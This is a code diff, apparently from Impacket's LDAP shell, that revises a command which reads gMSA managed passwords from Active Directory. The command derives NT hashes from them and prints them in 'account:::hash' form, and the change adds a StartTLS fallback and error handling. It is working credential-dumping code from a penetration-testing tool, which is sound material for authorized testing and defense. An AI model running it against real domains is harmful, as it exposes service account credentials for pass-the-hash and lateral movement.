@@ -540,24 +540,32 @@ class LdapShell(cmd.Cmd):
             print("Unable to Read LAPS Password for Computer")
     
     def do_get_gmsa_password(self, target):
-        if target.lower() == "all":
-            print("Dumping all gMSA passwords")
-            try:
-               success = self.client.search(self.domain_dumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', attributes=['sAMAccountName','msDS-ManagedPassword'])
-               if success:
-                   for entry in self.client.response:
-                       sam = entry['attributes']['sAMAccountName']
-                       data = entry['attributes']['msDS-ManagedPassword']
-                       blob = MSDS_MANAGEDPASSWORD_BLOB()
-                       blob.fromString(data)
-                       hash = MD4.new ()
-                       hash.update (blob['CurrentPassword'][:-2])
-                       passwd = binascii.hexlify(hash.digest()).decode("utf-8")
-                       userpass = sam + ':::' + passwd
-                       print(userpass)
-            except:
-                pass    
-                
+        if not self.client.tls_started and not self.client.server.ssl:
+                LOG.info('Dumping gMSA password requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS')
+                if not self.client.start_tls():
+                    LOG.error('StartTLS failed')
+                    return False
+
+        if (target.lower()=="all"):
+
+            success = self.client.search(self.domain_dumper.root, '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=ldap3.SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+            if success:
+                for entry in self.client.response:
+                    try:
+                        sam = entry['attributes']['sAMAccountName']
+                        data = entry['attributes']['msDS-ManagedPassword']
+                        blob = MSDS_MANAGEDPASSWORD_BLOB()
+                        blob.fromString(data)
+                        hash = MD4.new ()
+                        hash.update (blob['CurrentPassword'][:-2])
+                        passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                        userpass = sam + ':::' + passwd
+                        print("Dumping all gMSA passwords")
+                        print(userpass)
+                    except:
+                        continue
+            else:
+                 print("Target not found, maybe add the $?")
                 
         elif target != "":
             print("Dumping %s gMSA password" % target)
@@ -577,7 +585,7 @@ class LdapShell(cmd.Cmd):
             except:
                 pass  
         else:
-            print("Expected target name")     
+            print("Expected target name ending with $")  
     
     def do_grant_control(self, line):
         args = shlex.split(line)
